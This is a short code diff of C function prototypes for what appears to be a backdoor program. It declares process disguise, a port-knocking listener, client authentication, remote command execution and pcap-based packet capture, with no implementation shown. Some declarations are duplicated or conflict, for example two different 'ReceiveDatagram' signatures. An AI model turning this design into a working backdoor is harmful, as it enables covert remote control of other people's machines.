@@ -68,9 +68,13 @@ unsigned short csum (unsigned short *, int);
 void* ReceiveDatagram (void *);
 char * resolve_host (const char *);
 char * GetIPAddress (void);
+
+//SPY
 void disguise(char ** argv);
 char* getDisguise();
 void setDisguise(char * disguise, char * argv);
+
+//BACKJAKE
 int main(int argc, char** argv);
 void initializeSocket(AddrInfo *Addr_Ptr);
 void initializePcap(PcapInfo *pcap_ptr, AddrInfo *Addr_Ptr);
@@ -79,16 +83,19 @@ void checkArgs(int argc, char **argv);
 void usage(char ** argv);
 void setupSignals();
 void authenticateClient();
-static void endProgram (int signo);
-static void unlock (int signo);
+void endProgram (int signo);
+void unlock (int signo);
 void* knockListener(void* pcap_arg);
 void executeCommand();
 void spawnThread();
 void setConfig();
 char* readConfigFile();
-void pcapListen();
-void pcapCompile();
-void pcapFilter();
+
+//RECV
+void* ReceiveDatagram (void *pcap_arg);
+void pcapListen(PcapInfo * pcap_ptr);
+void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp);
+void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp);
 int checkPacketSize();
-void packetHandler();
+void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 int PrintInHex(char *mesg, unsigned char *p, int len);
